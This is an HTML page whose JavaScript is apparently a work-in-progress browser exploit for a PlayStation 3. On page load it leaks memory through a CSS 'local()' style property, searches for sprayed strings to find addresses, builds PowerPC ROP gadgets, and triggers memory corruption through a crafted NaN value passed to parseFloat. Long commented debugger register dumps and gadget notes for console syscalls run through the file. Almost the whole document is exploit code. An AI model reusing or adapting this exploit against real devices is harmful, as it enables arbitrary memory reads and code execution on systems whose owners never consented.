<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<script src="include/runOnLoad.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		while (1)
		{
			var search_base = 0x80200000;
			var search_size = 0x0027500;
			
			var dat = readMemory(search_base, search_size);
			
			// move past "local("
			dat = dat.substr(6, search_size);
			
			// loop for tag
			for (var i = 0; i < (search_size*2); i += 0x10)
			//for (var i = 0; i < (20000*0x10); i += 0x10)
			{
				if (i > 20000*0x10) {return 0;}
				if (dat.charCodeAt(i/2) == pattern)
				{
					var match = 0;
					
					// loop next 5 bits
					for (var k = 0; k < len; k+=2)
					{
						// convert to string
						if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
						{
							break;
						}
						// increment match
						match += 2;
					}
					
					// we got a complete match
					if (match == len)
					{
						// hold exploit addr
						var exploit_addr = search_base + i + 2;
						
						// display the exploit address
						dbg("Found " + name + " at: " + exploit_addr.toString(16));
						//dbg("Loop: "+(i/0x10));
						dat=null;
						return exploit_addr;
					}
				}
			}
			dat=null;			
		}
		dbg("string var could not be located in search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,j1,j2;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var trigger_state=false;
		
		dbg("Processing gadget string.. Searching for valid offset....");			
		do{
		
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// Working, well it does the syscalls
		//gadget =  unescape("\u7E2F\u000C\u6740\u7E2F"); //  sys_sm_shutdown 
		//gadget =  unescape("\u7E2F\u0061\u04E0\u7E2F"); //  sys_process_exit 
		
		//gadget =  unescape("\u7E2F\u0042\uDD9C\u7E2F"); //   
		
		//gadget =  unescape("\u7E2F\u0061\u58B4\u7E2F"); //   0x00000000006158b4 : li r11, 0x149 ; mflr r0 ; std r0, 0x10(r1) ; sc ; ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr // 396001497c0802a6f801001044000002e80100107c6307b47c0803a64e800020
		
		//gadget =  unescape("\u7E2F\u0054\u0FEC\u7E2F"); //   0x0000000000540fec : li r11, 0x14b ; mflr r0 ; std r0, 0x10(r1) ; lwz r3, 0x24(r3) ; sc ; ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr // 3960014b7c0802a6f80100108063002444000002e80100107c6307b47c0803a64e800020
		
		//gadget =  unescape("\u7E2F\u006F\uC260\u7E2F"); // wmemcpy
		 
		//gadget =  unescape("\u7E2F\u0054\u1010\u7E2F"); // 
		
		//gadget =  unescape("\u7E2F\u005F\uEB2C\u7E2F"); // 0x00000000005feb2c : mtlr r3 ; blr // 7c6803a64e800020
		
		//gadget =  unescape("\u7E2F\u0055\u46F4\u7E2F"); // 0x00000000005546f4 : mr r3, r9 ; blr // 7d234b784e800020
		
		
		/*
		000AE358 83A2AD54 lwz        r29,-0x52AC(r2)
		000AE35C 7FA3EB78 mr         r3,r29                        02 (000AE358) REG
		000AE360 4BFF4365 bl         0x000A26C4                    08
		*/
		//gadget =  unescape("\u7E2F\u000A\uE358\u7E2F"); // 
		
		
		/*
		000AE378 39600193 li         r11,0x193
		000AE37C 44000002 sc 
		*/
		//gadget =  unescape("\u7E2F\u000A\uE378\u7E2F"); // sys_tty_write
		
		//gadget =  unescape("\u02F7\u0055\u46F4\u02F7"); // write 0x0000000002F78021 to r2 
		
		//gadget =  unescape("\u02F7\u000A\uE8B8\u02F7"); // 
		
		//gadget =  unescape("\u02F7\u000A\uE8B8\u02F7"); // 
		
		//gadget =  unescape("\u02F7\u0061\u5588\u02F7"); // IDPS Test
		
		
		
		
		
		/*
		ON BP
		r0=00000000000106F0        r8=0000000000000001       r16=0000000000000000       r24=FFFFFFFE8021FF72
		r1=000000008FD8D5C0        r9=0000000080217D72       r17=0000000000000000       r25=000000008FD8E3C8
		r2=0000000002F78020       r10=000000008021FF72       r18=FFFFFFFFFFFFFFFE       r26=000000008045D6C0
		r3=000000008FD8D6C0       r11=000000008020FC42       r19=00000000801806B8       r27=00000000802A04E0
		r4=000000008021FF72       r12=0000000088088044       r20=0000000000000001       r28=000000008FD8D6C0
		r5=000000008F780148       r13=000000001000D420       r21=00000000803DDF54       r29=000000008FD8D6C4
		r6=FFFFFFFE8021FF72       r14=0000000000000000       r22=000000008FD8E3C8       r30=0000000002D19388
		r7=000000008FD8E3C8       r15=803C4DC000000000       r23=0000000000000000       r31=000000008FD8D6C0

		xer=0000000020000000       ctr=00000000000106F0        lr=0000000003A9F7E8     fpscr=A2001100

		cr=88088042               cr0=LT cr1=LT cr2=   cr3=LT cr4=LT cr5=   cr6=GT cr7=EQ

		pc=00000000000106F0           mr   r1,r11 
		
		
		1st 16 bytes
		
		lr=0000000003A9F7E8  --> E8 41 00 28 E8 01 00 A0 7B E3 00 20 EB C1 00 80 7C 08 03 A6
		pc=00000000000106F0  --> 90 1F 00 30 4B FF FF C8 E9 61 00 00 EB EB FF F8 7D 61 5B 78
		r0=00000000000106F0  --> 7D 61 5B 78 4E 80 00 20 00 00 00 00 00 00 00 00 80 01 00 01
		r1=000000008FD8D5C0  --> 00 00 00 00 8F D8 D6 50 00 00 00 00 00 00 00 00 00 00 00 00
		r2=0000000002F78020  --> 60 00 00 00 38 00 00 00 7D 20 F8 A8 7C 00 F9 AD 40 C2 FF F8
		r3=000000008FD8D6C0  --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00 <-- close to NAN
		r4=000000008021FF72  --> 80 21 7D 72 02 F7 00 00 00 00 00 00 00 00 00 00 00 02 00 00
		r5=000000008F780148  --> FF FF FF FE 80 45 D6 C0 FF FF FF FE 80 21 FF 72 FF FF FF FE
		r6=FFFFFFFE8021FF72  --> DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD
		r7=000000008FD8E3C8  --> 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00
		r8=0000000000000001  --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r9=0000000080217D72  --> AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA <-- jump_2
		r10=000000008021FF72 --> 80 21 7D 72 02 F7 00 00 00 00 00 00 00 00 00 00 00 02 00 00
		r11=000000008020FC42 --> 00 01 06 F0 02 F7 80 20 FC 58 00 00 00 00 00 00 00 00 01 18
		r12=0000000088088044 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r13=000000001000D420 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r14=0000000000000000 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r15=803C4DC000000000 --> DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD
		r16=0000000000000000 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r17=0000000000000000 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r18=FFFFFFFFFFFFFFFE --> DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD
		r19=00000000801806B8 --> 00 00 00 02 00 19 06 10 80 1F FC 78 80 18 0C 00 80 18 0C 18
		r20=0000000000000001 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r21=00000000803DDF54 --> 03 85 FB B8 00 00 00 01 00 00 00 01 03 86 48 94 00 00 00 00
		r22=000000008FD8E3C8 --> 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00
		r23=0000000000000000 --> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
		r24=FFFFFFFE8021FF72 --> DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD
		r25=000000008FD8E3C8 --> 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00
		r26=000000008045D6C0 --> 02 C9 E6 30 80 21 DF 78 80 40 02 78 00 00 00 00 00 00 00 00
		r27=00000000802A04E0 --> 02 CC 37 98 02 CC 39 EC 00 00 00 01 80 2A EF B8 80 1F 30 30
		r28=000000008FD8D6C0 --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00 <-- close to NAN
		r29=000000008FD8D6C4 --> 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00 03 79 B1 54 <-- close to NAN
		r30=0000000002D19388 --> 02 CC B2 E8 02 CC B2 D8 02 CC B2 C8 02 C9 03 B0 02 D5 EC 14
		r31=000000008FD8D6C0 --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00 <-- close to NAN
		
		
		AFTER 1ST STEP
		
		r0=00000000000106F0        r8=0000000000000001       r16=0000000000000000       r24=FFFFFFFE8021FF72
		r1=000000008020FC42        r9=0000000080217D72       r17=0000000000000000       r25=000000008FD8E3C8
		r2=0000000002F78020       r10=000000008021FF72       r18=FFFFFFFFFFFFFFFE       r26=000000008045D6C0
		r3=000000008FD8D6C0       r11=000000008020FC42       r19=00000000801806B8       r27=00000000802A04E0
		r4=000000008021FF72       r12=0000000088088044       r20=0000000000000001       r28=000000008FD8D6C0
		r5=000000008F780148       r13=000000001000D420       r21=00000000803DDF54       r29=000000008FD8D6C4
		r6=FFFFFFFE8021FF72       r14=0000000000000000       r22=000000008FD8E3C8       r30=0000000002D19388
		r7=000000008FD8E3C8       r15=803C4DC000000000       r23=0000000000000000       r31=000000008FD8D6C0

		xer=0000000020000000       ctr=00000000000106F0        lr=0000000003A9F7E8     fpscr=A2001100

		cr=88088042               cr0=LT cr1=LT cr2=   cr3=LT cr4=LT cr5=   cr6=GT cr7=EQ

		pc=00000000000106F4           blr

		
		1st 16 bytes
		
		lr=0000000003A9F7E8	 --> E8 41 00 28 E8 01 00 A0 7B E3 00 20 EB C1 00 80 7C 08 03 A6
		pc=00000000000106F4  --> 4E 80 00 20 00 00 00 00 00 00 00 00 80 01 00 01 F8 21 FF B1
		r1=000000008020FC42  --> 00 01 06 F0 02 F7 80 20 FC 58 00 00 00 00 00 00 00 00 01 18
		
		
		RETURNS HERE
		
		0x03A9F7E8
		
		03A9F7E8 E8410028 ld         r2,0x28(r1)
		03A9F7EC E80100A0 ld         r0,0xA0(r1)                    PIPE
		03A9F7F0 7BE30020 clrldi     r3,r31,32
		03A9F7F4 EBC10080 ld         r30,0x80(r1)
		03A9F7F8 7C0803A6 mtspr      lr,r0
		03A9F7FC EBE10088 ld         r31,0x88(r1)
		03A9F800 38210090 addi       r1,r1,0x90
		03A9F804 4E800020 blr 
		
		//**CHOPPED OFF A ROW** :)
		r1=000000008020FC42        r9=0000000080217D72       r17=0000000000000000       r25=000000008FD8E3C8
		r2=0000000002F78020       r10=000000008021FF72       r18=FFFFFFFFFFFFFFFE       r26=000000008045D6C0
		r3=000000008FD8D6C0       r11=000000008020FC42       r19=00000000801806B8       r27=00000000802A04E0
		r4=000000008021FF72       r12=0000000088088044       r20=0000000000000001       r28=000000008FD8D6C0
		r5=000000008F780148       r13=000000001000D420       r21=00000000803DDF54       r29=000000008FD8D6C4
		r6=FFFFFFFE8021FF72       r14=0000000000000000       r22=000000008FD8E3C8       r30=0000000002D19388
		r7=000000008FD8E3C8       r15=803C4DC000000000       r23=0000000000000000       r31=000000008FD8D6C0

		xer=0000000020000000       ctr=00000000000106F0        lr=0000000003A9F7E8     fpscr=A2001100

		cr=88088042               cr0=LT cr1=LT cr2=   cr3=LT cr4=LT cr5=   cr6=GT cr7=EQ

		pc=0000000003A9F7E8           ld   r2,0x28(r1) 

		
		NEXT STEP
		
		Sets r2 from bytes at 0x8020FC6A
		
		03A9F7E8 E8410028 ld         r2,0x28(r1)
		
		r2=00300000002302C9  --> + 0x28 = 0x8020FC6A --> 00 30 00 00 00 23 02 C9 0D 78 00 00 00 03 FF FF FF FF 02 C9
		
		
		NEXT STEP
		
		Sets r0 from bytes at 0x8020FCE2
		
		03A9F7EC E80100A0 ld         r0,0xA0(r1) 
		
		r0=0001000000000000  --> + 0xA0 = 0x8020FCE2 --> 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 85
		
		
		NEXT STEP
		
		03A9F7F0 7BE30020 clrldi     r3,r31,32 
		
		BEFORE
		r3=000000008FD8D6C0  --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00
		r31=000000008FD8D6C0 --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00
		
		AFTER
		r3=000000008FD8D6C0  --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00
		r31=000000008FD8D6C0 --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00
		
		^^ *DOES NOT CHANGE* ^^
		
		
		NEXT STEP
		
		03A9F7F4 EBC10080 ld         r30,0x80(r1) 
		
		BEFORE
		r30=0000000002D19388  --> 02 CC B2 E8 02 CC B2 D8 02 CC B2 C8 02 C9 03 B0 02 D5 EC 14
		
		AFTER
		r30=0001000000000000  -->  + 0x80 = 0x8020FCC2  --> 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 86
		
		
		NEXT STEP
		
		03A9F7F8 7C0803A6 mtspr      lr,r0 
		
		BEFORE
		lr=0000000003A9F7E8  --> E8 41 00 28 E8 01 00 A0 7B E3 00 20 EB C1 00 80 7C 08 03 A6
		
		AFTER
		lr=0001000000000000  --> DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD
		pc=0000000003A9F7FC  --> EB E1 00 88 38 21 00 90 4E 80 00 20 F8 A1 00 70 C8 21 00 70
		
		^^ *NEED TO FIX r0 before??* ^^
		
		
		NEXT STEP
		
		03A9F7FC EBE10088 ld         r31,0x88(r1) 
		
		BEFORE
		r1=000000008020FC42   --> 00 01 06 F0 02 F7 80 20 FC 58 00 00 00 00 00 00 00 00 01 18
		r31=000000008FD8D6C0  --> 00 00 00 00 8F D8 D7 B0 00 00 00 00 00 00 00 40 00 00 00 00
		
		AFTER
		r31=0000000000000000  --> + 0x88 = 0x8020FCCA --> 00 00 00 00 00 00 00 00 00 00 03 86 2B 44 00 00 00 00 00 00
		
		
		NEXT STEP
		
		03A9F800 38210090 addi       r1,r1,0x90 
		
		BEFORE
		r1=000000008020FC42 + 0x90 = 0x8020FCD2 --> 00 00 03 86 2B 44 00 00 00 00 00 00 00 02 40 00 00 01 00 00
		
		AFTER
		pc=0000000003A9F804  --> 4E 80 00 20 F8 A1 00 70 C8 21 00 70 C8 1E 80 08 FF 81 00 00
		r1=000000008020FCD2  --> 00 00 03 86 2B 44 00 00 00 00 00 00 00 02 40 00 00 01 00 00
		
		
		NEXT STEP
		
		**CRASH**
		r0=0001000000000000        r8=0000000000000001       r16=0000000000000000       r24=FFFFFFFE8021FF72
		r1=000000008020FCD2        r9=0000000080217D72       r17=0000000000000000       r25=000000008FD8E3C8
		r2=00300000002302C9       r10=000000008021FF72       r18=FFFFFFFFFFFFFFFE       r26=000000008045D6C0
		r3=000000008FD8D6C0       r11=000000008020FC42       r19=00000000801806B8       r27=00000000802A04E0
		r4=000000008021FF72       r12=0000000088088044       r20=0000000000000001       r28=000000008FD8D6C0
		r5=000000008F780148       r13=000000001000D420       r21=00000000803DDF54       r29=000000008FD8D6C4
		r6=FFFFFFFE8021FF72       r14=0000000000000000       r22=000000008FD8E3C8       r30=0001000000000000
		r7=000000008FD8E3C8       r15=803C4DC000000000       r23=0000000000000000       r31=0000000000000000

		xer=0000000020000000       ctr=00000000000106F0        lr=0001000000000000     fpscr=A2001100

		cr=88088042               cr0=LT cr1=LT cr2=   cr3=LT cr4=LT cr5=   cr6=GT cr7=EQ

		pc=0001000000000000

		TEXT_SLB_MISS
		*/
		//gadget =  unescape("\u02F7\u0001\u06F0\u02F7"); // 0x00000000000106f0 : mr r1, r11 ; blr // 7d615b784e800020
		
		
		
		
		// ** possible candidate for ROP launch **
		// controllable r3
		// payload is in r4
		// need padding to control r5
		//gadget =  unescape("\u02F7\u0025\u2894\u02F7"); // 0x0000000000252894 : addi r4, r9, 1 ; extsw r3, r4 ; blr // 388900017c8307b44e800020
		
		
		//gadget =  unescape("\u02F7\u0001\u0254\u02F7"); // 0x0000000000010254 : li r3, 0 ; mflr r0 ; stdu r1, -0x70(r1) ; std r0, 0x80(r1) ; bl 0x61eec4 ; nop ; ld r0, 0x80(r1) ; addi r1, r1, 0x70 ; mtlr r0 ; blr // 386000007c0802a6f821ff91f80100804860ec3d60000000e8010080382100707c0803a64e800020
		 
		 
		// sys_storage_open
		//gadget =  unescape("\u02F7\u000C\uE344\u02F7"); // 0x00000000000ce344 : li r11, 0x258 ; mflr r0 ; std r0, 0x10(r1) ; sc ; ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr // 396002587c0802a6f801001044000002e80100107c6307b47c0803a64e800020
		 
		gadget =  unescape("\u02F7\u000C\uEFE4\u02F7"); // 0x00000000000cefe4 : blr ; blr ; blr // 4e8000204e8000204e800020
		 
		gadget_addr = findExploit("gadget",gadget,0x02F7,0x4);
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");	
		do{
		jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u02F7");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x02F7));
		jump_2_addr = findExploit("j2",j2,0x02F7,0x1C);
		}
		while(jump_2_addr==0);
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		do{
		jump_1 = unescape("\u4141\u4141\u4141\u02F7");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));
		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x02F7));
		jump_1_addr = findExploit("j1",j1,0x02F7,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		//dbg("gadget: "+a2hexnull(gadget));
		dbg("gadget: " + a2hex(gadget));
		dbg("gadget variable offset (r11): " + gadget_addr.toString(16));
		//dbg("jump_2: "+a2hexnull(j2));
		dbg("gadget (r2 1st 2 bytes + 0000): "+a2hex(j2));
		dbg("jump_2 variable offset (r9): " + jump_2_addr.toString(16));
		//dbg("jump_1: "+a2hexnull(j1));
		dbg("gadget: " + a2hex(j1));
		dbg("jump_1 variable offset (r4 + r24lo): " + jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		
		
		// Cookie Stuff
		//setCookie("gadget: ", a2hex(gadget));
		//getCookie();
		//setCookie("gadget_variable_offset: ", gadget_addr.toString(16));
		//getCookie();
		//setCookie("jump_1_addr: ", jump_1_addr.toString(16));
		//getCookie();
		//setCookie("jump_2_addr: ", jump_2_addr.toString(16));
		//getCookie();
		//setCookie("gadget: ", a2hex(gadget), "\ngadget_variable_offset: ", gadget_addr.toString(16), "\njump_1_addr: ", jump_1_addr.toString(16), "\njump_2_addr: ", jump_2_addr.toString(16));
		//setCookie(a2hex(gadget) + "," + gadget_addr.toString(16) + "," +  jump_1_addr.toString(16) + "," +  jump_2_addr.toString(16));
		
		// Stores here in memory DEX: 
		// 0x800CFBF0 / 0x801DFD48 / 0x801D5578 / 0x8017E2B0 / 0x801B4F1F / 0x807F3498
		// unicode: 0x8017C960 / unicode: 0x8017B010 / unicode: 0x8017AFF5 / unicode: 0x801B35D5 / 
		//setCookie("D4T__C00K13___");
		
		
		var gadget_next1 = gadget_addr + 4;
		var gadget_next2 = gadget_next1 + 4;
		var gadget_next3 = gadget_next2 + 4;
		var gadget_next4 = gadget_next3 + 4;
		setCookie("gadget_addr: " + gadget_addr.toString(16) + "\ngadget_next1: " + gadget_next1.toString(16) +  "\ngadget_next2: " + gadget_next2.toString(16) +  "\ngadget_next3: " + gadget_next3.toString(16) +  "\ngadget_next4: " + gadget_next4.toString(16) + "\njump_2 variable offset (r9): " + jump_2_addr.toString(16) + "\ngadget variable offset (r11): " + gadget_addr.toString(16) + "\njump_1 variable offset (r4 + r24lo): " + jump_1_addr.toString(16));
		
		
		//setCookie(unescape("\u02F7\u0025\u2894\u02F7"));
		
		getCookie(); 
		
		
		
		// Check trigger state
		if (confirm('Proceed To Trigger?')) {
		//alert('trigger ' + jump_1_addr.toString(16));
		trigger(jump_1_addr);
		trigger_state = true;
		} else {
			trigger_state = false
		}
		
		// Refresh Page?
		if (!trigger_state) {
			if (confirm('Refresh Page?')) {
			location.reload();
			} else {
				return;
			}
		}
		
		trigger_state = false;
		//trigger(jump_1_addr);
		return;
	} catch(e) {
		dbg(e);
	}
}

function setCookie(value){
    document.cookie = value;
}

function getCookie(){
	alert(document.cookie);
}


</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears, reload page because exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
